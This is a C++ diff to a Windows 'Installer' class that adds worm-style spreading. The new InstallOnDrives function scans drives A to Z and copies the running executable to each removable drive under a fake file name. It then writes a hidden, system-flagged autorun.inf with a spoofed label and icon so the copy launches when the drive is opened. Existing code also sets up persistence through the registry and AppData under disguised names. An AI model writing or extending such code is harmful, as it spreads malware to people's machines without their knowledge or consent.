@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "Installer.h"
+#include "Util.h"
 #include "Settings.h"
 
 Installer installer;
@@ -7,6 +8,7 @@ Installer installer;
 Installer::Installer()
 {
 	GetModuleFileName(NULL, exeName, MAX_PATH);
+
 
 	TCHAR *appData;
 	size_t appDataSize;
@@ -21,6 +23,19 @@ Installer::Installer()
 	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));
 
 	free(appData);
+
+
+	const TCHAR* autorunStrU =
+		_T("[autorun]\r\n")
+		_T("label=")  V_FAKE_USB_LABEL  _T("\r\n")
+		_T("action=") V_FAKE_USB_ACTION _T("\r\n")
+		_T("open=")   V_FAKE_USB_FILE   _T("\r\n")
+		_T("icon=")   V_FAKE_USB_FILE   _T(",0");
+	const std::string autorunStrCpp = Util::t2s(autorunStrU);
+
+	autorunBytes = autorunStrCpp.size();
+	memcpy(autorunData, autorunStrCpp.c_str(), autorunBytes);
+
 }
 Installer::~Installer()
 {
@@ -32,7 +47,47 @@ bool Installer::SetAutorun(bool autorun)
 	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun);
 }
 
-bool Installer::CopyTo(TCHAR* path)
+bool Installer::InstallOnDrives()
+{
+	TCHAR drive[_MAX_PATH] = _T(" :\\");
+	TCHAR target[_MAX_PATH];
+
+	for (TCHAR c = 'A'; c <= 'Z'; c++) {
+		drive[0] = c;
+
+		if (GetDriveType(drive) != DRIVE_REMOVABLE) {
+			continue;
+		}
+
+		target[0] = '\0';
+		if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
+			continue;
+		}
+
+		if (!this->CopyTo(target)) {
+			continue;
+		}
+
+		target[0] = '\0';
+		if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
+			continue;
+		}
+
+		HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+		if (hFile == INVALID_HANDLE_VALUE) {
+			continue;
+		}
+
+		DWORD written;
+		WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
+
+		CloseHandle(hFile);
+	}
+	return true;
+}
+
+bool Installer::CopyTo(const TCHAR* path)
 {
 	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
 	{
@@ -40,7 +95,7 @@ bool Installer::CopyTo(TCHAR* path)
 	}
 	else if (CopyFile(exeName, path, FALSE))
 	{
-		SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+		this->HideFile(path);
 		return true;
 	}
 	else
@@ -48,6 +103,10 @@ bool Installer::CopyTo(TCHAR* path)
 		Error(_T("Failed to copy file"));
 		return false;
 	}
+}
+bool Installer::HideFile(const TCHAR* path)
+{
+	return TRUE == SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 bool Installer::SetAutorunAppdata(bool autorun)
 {
